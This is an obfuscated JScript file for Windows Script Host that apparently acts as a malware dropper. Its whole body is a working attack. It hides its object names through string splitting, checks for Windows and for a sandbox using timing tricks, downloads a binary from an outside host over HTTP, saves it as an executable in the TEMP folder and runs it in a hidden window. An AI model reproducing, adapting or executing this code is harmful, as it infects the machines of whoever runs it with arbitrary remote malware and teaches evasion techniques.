var ZV = false;
var VU = "Create"+"Object";
var EB = function UU() {return WScript[VU]("WScript"+".Shell");}(), Q = 11;
var QK = "MSXML2"+".XMLHTTP";
var RM = 2;
var MX = RM - 2;
function LJ(X){EB["Run"](X, MX, MX);};
function R(){return QK + "";};
function IP(Y, G){MX = MX * 1; return Y - G;};
function T(){return VU;};
/*@cc_on
  @if (@_win32 || @_win64)
    ZV = true;
  @end
@*/
if (ZV)
{
var AX = "";
function H(){return 22;};
var I = 0; var M = 0;
function CQ()
{
var PD = new this["Date"]();
var R0 = PD["getUTCMilliseconds"]();
WScript["Sleep"](H());
var PD = new this["Date"]();
var EA = PD["getUTCMilliseconds"]();
WScript["Sleep"](H());
var PD = new this["Date"]();
var HS = PD["getUTCMilliseconds"]();
var I = "CI";
I = IP(EA, R0);
var M = "B";
M = IP(HS, EA);
AX = "open";
return IP(I, M);
}
var JZ = false;
var U = false;
for (var RG = MX; RG < H() * 1; RG++){if (CQ() != MX){
JZ = true; 
M = "31" + 11 * I + M; 
U = true; 
break;
}}
function L() {return ((JZ == true) && (JZ == U)) ? 1 : MX;};
if (JZ && L() && U){
function AQ() {return EB["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "5TVRRFRKpHg74bX.ex" + "e";};
 PC = R();
 XH = WScript[VU](PC);
 var Z = 1;
do { 
	for (;Z;){
	try {
		if (Z == 1)
		{
			XH[AX]("GET", "http://be-stlines-tore.com/u3rsap", false);
			XH["send"]();
			S = "Sleep";
			Z = 2;
		}
		WScript[S](H() + 120); 
		if (XH["readystate"] < 2 * 2) continue;
		Z = MX;
		function C(EO) {var J = (1, 2, 3, 4, 5, EO); return J;};
		QX = WScript[T()]("ADODB.Stream");
		PC = QX;
		PC[AX]();
		PC["type"] = C(1);
		PC["write"](XH["ResponseBody"]);
		QX["position"] = C(MX);
		PC["Save" + "ToFile"](AQ(), 2);
		QX["cl"+"ose"]();
		BR = AQ();
		LJ(BR);
	} catch(QJ){};};
}while (Z);
}
}

